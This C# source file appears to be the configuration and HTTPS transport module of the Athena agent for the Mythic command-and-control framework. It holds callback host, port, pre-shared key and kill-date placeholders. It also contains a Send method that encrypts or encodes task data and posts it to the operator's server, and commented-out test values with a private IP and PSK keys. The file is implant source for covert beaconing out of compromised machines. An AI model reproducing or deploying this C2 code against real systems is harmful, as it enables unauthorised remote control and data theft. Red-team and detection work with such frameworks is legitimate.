using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class MythicConfig
    {
        public HTTPS httpConfig { get; set; }
        public SMB smbConfig { get; set; }
        public Websocket websocketConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public MythicConfig()
        {
            
            this.uuid = "%UUID%";
            this.killDate = DateTime.Parse("killdate");
            int sleep = int.TryParse("callback_jitter", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.httpConfig = new HTTPS(this.uuid);
            this.smbConfig = new SMB();
            this.websocketConfig = new Websocket();
            
            /**
            
            this.uuid = "c8935bb0-4ffa-4120-b321-696173789594"; //Encrypted (PSK) Key exchange true
            //this.uuid = "521486f0-c78d-4fa5-a1af-e4cb01e96462"; //Encrypted (PSK) Key exchange false
            //this.uuid = "1eb12f6b-9346-4e5c-9278-0b7eb3944cd2"; //unencryped key exchange true
            //this.uuid = "a9f3eb27-7b82-496b-93fb-3ef9755623a2"; //unencrypted
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("callback_jitter", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.httpConfig = new HTTPS(this.uuid);
            this.smbConfig = new SMB();
            this.websocketConfig = new Websocket();
            **/
            
        }
    }
    public class HTTPS
    {
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public string getURL { get; set; }
        public string postURL { get; set; }
        public string psk { get; set; }
        public string param { get; set; }
        public DateTime killDate { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        //Change this to Dictionary or Convert from JSON string?
        public string headers { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        public PSKCrypto crypt { get; set; }

        public HTTPS(string uuid)
        {
            
            int callbackPort = Int32.Parse("callback_port");
            string callbackHost = "callback_host";
            string callbackURL = $"{callbackHost}:{callbackPort}";
            this.userAgent = "user-agent";
            this.hostHeader = "%HOSTHEADER%";
            this.getURL = "callback_host:callback_port/get_uri?query_path_name";
            this.postURL = "callback_host:callback_port/post_uri";
            this.param = "query_path_name";
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.psk = "AESPSK";
            //Doesn't do anything yet
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            
            /**

            int callbackPort = Int32.Parse("80");
            string callbackHost = "https://10.10.50.43";
            string callbackURL = $"{callbackHost}:{callbackPort}";
            this.userAgent = "user-agent";
            this.hostHeader = "%HOSTHEADER%";
            this.getURL = "https://10.10.50.43:80/index.html?q";
            this.postURL = "https://10.10.50.43:80/data";
            this.param = "query_path_name";
            this.proxyHost = ":";
            this.proxyPass = "";
            this.proxyUser = "";
            //this.psk = "Shl8/vfy39XjmNaQnp0+RntCrtHTFPJEHa3VyO5l5IQ="; //Encrypted key exchange false
            this.psk = "kkNbLHjN/Kn+jp4d/Dm06MqvHkL6lLEXbIboUzPbfm8="; //Encrypted key exchange true
            //this.psk = ""; //Unencrypted
            //Doesn't do anything yet
            this.encryptedExchangeCheck = bool.Parse("True");
            **/
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                Globals.encrypted = true;
            }
        }
        public async Task<string> Send(object obj)
        {
            try
            {

                string json = JsonConvert.SerializeObject(obj);
                Console.WriteLine("Request: " + json);
                if (Globals.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }
                //var content = new StringContent(Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json));
                var content = new StringContent(json);
                //var content = new StringContent(json);
                var response = await Globals.client.PostAsync(Globals.mc.MythicConfig.httpConfig.postURL, content);
                
                string msg = response.Content.ReadAsStringAsync().Result;
                if (Globals.encrypted)
                {
                    msg = this.crypt.Decrypt(msg);
                }
                else
                {
                    msg = Misc.Base64Decode(msg).Substring(36);
                }
                Console.WriteLine("Response: " + msg);
                return msg;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return "";
            }
        }
    }
    public class Websocket
    {
    }
    public class SMB
    {
    }
}
